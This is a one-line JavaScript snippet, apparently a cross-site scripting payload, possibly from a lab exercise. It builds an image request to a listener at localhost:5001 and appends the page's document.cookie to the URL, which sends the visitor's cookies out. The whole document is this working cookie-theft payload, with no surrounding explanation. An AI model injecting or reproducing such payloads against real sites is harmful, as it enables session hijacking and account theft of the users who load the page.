new Image().src = `http://localhost:5001?${document.cookie.replace('#', encodeURIComponent('#'))}&random=${Math.random()}`
